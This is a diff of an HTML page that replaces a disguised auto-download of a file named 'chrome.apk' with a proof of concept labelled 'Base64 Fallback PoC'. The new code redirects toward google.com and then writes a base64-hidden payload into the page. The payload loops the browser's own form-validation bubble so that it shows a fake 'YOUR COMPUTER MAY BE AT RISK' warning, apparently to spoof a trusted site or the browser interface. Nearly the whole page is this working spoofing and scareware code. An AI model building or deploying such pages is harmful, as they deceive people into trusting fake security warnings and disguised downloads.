@@ -1,19 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Web Share + Auto Download</title>
+  <title>Web Share + Fallback</title>
+  <style>
+    #aaa {
+      position: absolute;
+      left: 35%;
+    }
+    #bbb {
+      display: none;
+    }
+  </style>
 </head>
-<body style="height:100vh; display:flex; justify-content:center; align-items:center;">
+<body style="height:100vh; display:flex; justify-content:center; align-items:center; flex-direction: column; gap: 20px;">
 
-<button id="shareDownloadBtn">Share & Auto Download File</button>
+<button id="shareBtn">Share</button>
+<button id="fallbackBtn">Trigger Fallback</button>
+
+<form>
+  <input placeholder="aaa" required id="aaa" />
+  <input id="bbb" type="submit" name="submit">
+</form>
 
 <script>
-document.getElementById("shareDownloadBtn").onclick = async function() {
-    // 1. Web Share API
+var w;
+var t;
+
+// Web Share API
+document.getElementById("shareBtn").onclick = async function() {
     if (navigator.share) {
         try {
             await navigator.share({
-                text: 'security Google GO Google.net',
+                title: 'security Google GO Google.net',
                 url: 'https://google.com'
             });
             console.log('Sharing success!');
@@ -23,16 +41,33 @@ document.getElementById("shareDownloadBtn").onclick = async function() {
     } else {
         alert('Web Share API not supported on this browser.');
     }
-
-    // 2. Auto-download file
-    const fileUrl = 'https://google.com'; // file eksternal
-    const a = document.createElement('a');
-    a.href = fileUrl;
-    a.download = 'chrome.apk'; // nama file yang akan di-download
-    document.body.appendChild(a);
-    a.click();               // trigger download otomatis
-    document.body.removeChild(a);
 };
+
+// Base64 Fallback PoC
+document.getElementById("fallbackBtn").onclick = function() {
+    // Redirect ke Google dulu
+    w = setTimeout(function() {
+        document.location = "http://www.google.com";
+    }, 2000);
+
+    // Interval untuk cek dan fallback
+    t = setInterval(bar, 1);
+};
+
+function bar() {
+    try {
+        w.location.href; // ini pasti error karena w adalah timeout
+    } catch(e) {
+        clearInterval(t);
+
+        // Tampilkan konten base64
+        setTimeout(function() {
+            document.write(atob(
+                'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uKGVkKSB7CmVkLnRhcmdldC5zZXRDdXN0b21WYWxpZGl0eSgiV0FSTklORyFcbllPVVIgQ09NUFVURVIgTUFZIENBIFRBUiBSSVNLIik7Cn0Kc2V0SW50ZXJ2YWwoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYmInKS5jbGljaygpIiwxMDAwKTsKfTs8L3NjcmlwdD4KPGZvcm0+CiAgICA8aW5wdXQgcGxhY2Vob2xkZXI9ImFhYSIgcmVxdWlyZWQgaWQ9ImFhYSIgLz4KICAgIDxpbnB1dCBpZD0iYmJiIiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCI+CiAgICA8L2Zvcm0+'
+            ));
+        }, 1000);
+    }
+}
 </script>
 
 </body>
